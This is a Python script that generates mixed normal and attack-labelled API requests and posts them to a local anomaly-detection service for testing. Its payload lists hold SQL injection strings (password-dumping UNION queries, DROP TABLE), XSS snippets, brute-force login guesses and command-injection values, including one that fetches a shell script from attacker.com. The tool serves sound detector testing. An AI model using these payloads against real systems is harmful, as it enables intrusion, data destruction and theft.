"""
Traffic Generator for API Anomaly Detection Testing
Generates realistic API traffic including normal and malicious requests
Sends requests to the detection system for real-time testing
"""

import requests
import random
import time
import string
from datetime import datetime
import threading

# ==================== CONFIGURATION ====================
API_BASE_URL = "http://127.0.0.1:5000"
REQUEST_INTERVAL = 0.5  # seconds between requests
ATTACK_RATIO = 0.15  # 15% attack traffic

# ==================== IP POOLS ====================
NORMAL_IPS = [f"192.168.1.{i}" for i in range(1, 20)]
ATTACK_IPS = [f"203.0.113.{i}" for i in range(1, 10)]  # Bogon range for testing

# ==================== API ENDPOINTS ====================
ENDPOINTS = [
    "/api/users",
    "/api/products",
    "/api/orders",
    "/api/auth/login",
    "/api/auth/register",
    "/api/search",
    "/api/upload",
    "/api/delete",
    "/api/admin",
]

# ==================== PAYLOADS ====================
class PayloadGenerator:
    
    @staticmethod
    def normal_payload():
        """Generate normal API request payloads"""
        payloads = [
            "username=john&password=12345",
            "search=laptop&category=electronics",
            "product_id=123&quantity=2",
            "user_id=456",
            "email=user@example.com&name=John",
            "title=New Item&description=This is a test item",
            "query=python programming&offset=0&limit=10",
            "filter=active&sort=date",
            "data={'user': 'john', 'age': 30}",
        ]
        return random.choice(payloads)
    
    @staticmethod
    def sql_injection_payload():
        """Generate SQL injection attack payloads"""
        payloads = [
            "username=admin' OR '1'='1",
            "id=1' UNION SELECT * FROM users--",
            "search=' OR 1=1 ORDER BY id--",
            "user_id=1; DROP TABLE users;--",
            "query='; DELETE FROM products WHERE '1'='1",
            "filter=active' OR 'a'='a",
            "username=admin' #",
            "id=1 UNION SELECT username, password FROM admin--",
        ]
        return random.choice(payloads)
    
    @staticmethod
    def xss_payload():
        """Generate XSS attack payloads"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror='alert(\"XSS\")'>",
            "<svg onload=alert('XSS')>",
            "javascript:<alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "<input onfocus=alert('XSS')>",
        ]
        return random.choice(payloads)
    
    @staticmethod
    def command_injection_payload():
        """Generate command injection attack payloads"""
        payloads = [
            "file=test.txt; cat /etc/passwd",
            "id=1 && ls -la",
            "query=test | whoami",
            "filename=`id`",
            "path=./$(whoami)",
            "data=$(curl http://attacker.com/shell.sh)",
        ]
        return random.choice(payloads)
    
    @staticmethod
    def brute_force_payload():
        """Generic payload for brute force detection"""
        return "username=admin&password=" + ''.join(random.choices(string.ascii_letters + string.digits, k=8))


# ==================== REQUEST BUILDERS ====================
class RequestBuilder:
    
    def __init__(self):
        self.failed_attempts = {}  # Track failed attempts per IP
    
    def create_normal_request(self):
        """Create a normal API request"""
        ip = random.choice(NORMAL_IPS)
        endpoint = random.choice(ENDPOINTS)
        method = random.choices(["GET", "POST", "PUT"], weights=[50, 40, 10])[0]
        payload = PayloadGenerator.normal_payload() if method in ["POST", "PUT"] else ""
        
        request_count = random.randint(20, 100)
        failed_attempts = self.failed_attempts.get(ip, 0)
        
        return {
            "ip_address": ip,
            "endpoint": endpoint,
            "method": method,
            "payload": payload,
            "uri": endpoint,
            "query_string": "" if method != "GET" else f"?page={random.randint(1, 10)}",
            "failed_attempt": False,
            "failed_attempts": failed_attempts,
            "request_count": request_count,
        }
    
    def create_sql_injection_request(self):
        """Create SQL injection attack request"""
        ip = random.choice(ATTACK_IPS)
        endpoint = random.choice(["/api/search", "/api/users", "/api/products"])
        payload = PayloadGenerator.sql_injection_payload()
        
        request_count = random.randint(150, 300)
        failed_attempts = self.failed_attempts.get(ip, 0)
        
        return {
            "ip_address": ip,
            "endpoint": endpoint,
            "method": "POST",
            "payload": payload,
            "uri": endpoint,
            "query_string": "",
            "failed_attempt": False,
            "failed_attempts": failed_attempts,
            "request_count": request_count,
        }
    
    def create_xss_request(self):
        """Create XSS attack request"""
        ip = random.choice(ATTACK_IPS)
        endpoint = random.choice(ENDPOINTS)
        payload = PayloadGenerator.xss_payload()
        
        request_count = random.randint(100, 200)
        
        return {
            "ip_address": ip,
            "endpoint": endpoint,
            "method": "POST",
            "payload": payload,
            "uri": endpoint,
            "query_string": "",
            "failed_attempt": False,
            "failed_attempts": 0,
            "request_count": request_count,
        }
    
    def create_brute_force_request(self):
        """Create brute force attack request"""
        ip = random.choice(ATTACK_IPS)
        endpoint = "/api/auth/login"
        payload = PayloadGenerator.brute_force_payload()
        
        failed_attempts = self.failed_attempts.get(ip, 0) + 1
        self.failed_attempts[ip] = failed_attempts
        
        request_count = failed_attempts
        
        return {
            "ip_address": ip,
            "endpoint": endpoint,
            "method": "POST",
            "payload": payload,
            "uri": endpoint,
            "query_string": "",
            "failed_attempt": True,
            "failed_attempts": failed_attempts,
            "request_count": request_count,
        }
    
    def create_random_attack_request(self):
        """Create a random attack request"""
        attack_type = random.choices(
            ["sql", "xss", "cmd", "brute"],
            weights=[35, 35, 20, 10]
        )[0]
        
        if attack_type == "sql":
            return self.create_sql_injection_request()
        elif attack_type == "xss":
            return self.create_xss_request()
        elif attack_type == "brute":
            return self.create_brute_force_request()
        else:
            # Command injection
            ip = random.choice(ATTACK_IPS)
            endpoint = random.choice(ENDPOINTS)
            payload = PayloadGenerator.command_injection_payload()
            
            return {
                "ip_address": ip,
                "endpoint": endpoint,
                "method": random.choice(["GET", "POST"]),
                "payload": payload,
                "uri": endpoint,
                "query_string": "",
                "failed_attempt": False,
                "failed_attempts": 0,
                "request_count": random.randint(50, 150),
            }


# ==================== TRAFFIC SIMULATOR ====================
class TrafficSimulator:
    
    def __init__(self, request_builder=None):
        self.request_builder = request_builder or RequestBuilder()
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.running = False
    
    def generate_request(self):
        """Generate either normal or attack request based on ratio"""
        if random.random() < ATTACK_RATIO:
            return self.request_builder.create_random_attack_request()
        else:
            return self.request_builder.create_normal_request()
    
    def send_request(self, request_data):
        """Send request to the API"""
        try:
            response = requests.post(
                f"{API_BASE_URL}/predict",
                json=request_data,
                timeout=5
            )
            
            if response.status_code == 200:
                self.successful_requests += 1
                result = response.json()
                return True, result
            else:
                self.failed_requests += 1
                return False, response.text
        
        except Exception as e:
            self.failed_requests += 1
            return False, str(e)
    
    def run_continuous(self, duration=None):
        """Run traffic generator continuously"""
        self.running = True
        start_time = time.time()
        
        print("\n" + "="*70)
        print("API Traffic Generator - Continuous Mode")
        print("="*70)
        print(f"Attack Ratio: {ATTACK_RATIO*100}%")
        print(f"Request Interval: {REQUEST_INTERVAL}s")
        print(f"Target: {API_BASE_URL}")
        print("-"*70)
        
        request_count = 0
        
        try:
            while self.running:
                if duration and (time.time() - start_time) > duration:
                    break
                
                request_data = self.generate_request()
                success, result = self.send_request(request_data)
                
                self.total_requests += 1
                request_count += 1
                
                # Display progress
                decision = result.get("final_decision", "UNKNOWN") if success else "ERROR"
                attack_type = result.get("rule_detection", []) if success else []
                attack_str = f" ({', '.join(attack_type[:2])})" if attack_type else ""
                
                status_symbol = "✓" if decision == "NORMAL" else "⚠" if decision == "ANOMALY" else "⛔"
                
                print(f"[{request_count:5d}] {status_symbol} {request_data['ip_address']:15} | "
                      f"{request_data['endpoint']:15} | {decision:10} {attack_str}")
                
                time.sleep(REQUEST_INTERVAL)
        
        except KeyboardInterrupt:
            print("\n\nStopping traffic generator...")
        
        finally:
            self.print_summary()
    
    def run_batch(self, num_requests):
        """Run a batch of requests"""
        print("\n" + "="*70)
        print(f"API Traffic Generator - Batch Mode ({num_requests} requests)")
        print("="*70)
        print(f"Attack Ratio: {ATTACK_RATIO*100}%")
        print("-"*70)
        
        for i in range(num_requests):
            request_data = self.generate_request()
            success, result = self.send_request(request_data)
            
            self.total_requests += 1
            
            if success:
                decision = result.get("final_decision", "UNKNOWN")
                attack_type = result.get("rule_detection", [])
                attack_str = f" ({', '.join(attack_type[:2])})" if attack_type else ""
                status_symbol = "✓" if decision == "NORMAL" else "⚠" if decision == "ANOMALY" else "⛔"
                
                print(f"[{i+1:5d}] {status_symbol} {request_data['ip_address']:15} | "
                      f"{request_data['endpoint']:15} | {decision:10} {attack_str}")
            
            time.sleep(REQUEST_INTERVAL)
        
        self.print_summary()
    
    def print_summary(self):
        """Print execution summary"""
        print("\n" + "="*70)
        print("Traffic Generation Summary")
        print("="*70)
        print(f"Total Requests Sent: {self.total_requests}")
        print(f"Successful: {self.successful_requests} ✓")
        print(f"Failed: {self.failed_requests} ✗")
        if self.total_requests > 0:
            print(f"Success Rate: {(self.successful_requests/self.total_requests*100):.2f}%")
            print(f"Attack Traffic: {int(self.total_requests * ATTACK_RATIO)}/{self.total_requests}")
        print("="*70 + "\n")


# ==================== MAIN ====================
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="API Traffic Generator")
    parser.add_argument("--mode", choices=["batch", "continuous"], default="batch",
                        help="Generation mode")
    parser.add_argument("--requests", type=int, default=50,
                        help="Number of requests (batch mode)")
    parser.add_argument("--duration", type=int, default=None,
                        help="Duration in seconds (continuous mode)")
    parser.add_argument("--interval", type=float, default=0.5,
                        help="Interval between requests in seconds")
    parser.add_argument("--attack-ratio", type=float, default=0.15,
                        help="Ratio of attack traffic (0.0-1.0)")
    
    args = parser.parse_args()
    
    REQUEST_INTERVAL = args.interval
    ATTACK_RATIO = args.attack_ratio
    
    simulator = TrafficSimulator()
    
    if args.mode == "continuous":
        simulator.run_continuous(duration=args.duration)
    else:
        simulator.run_batch(args.requests)
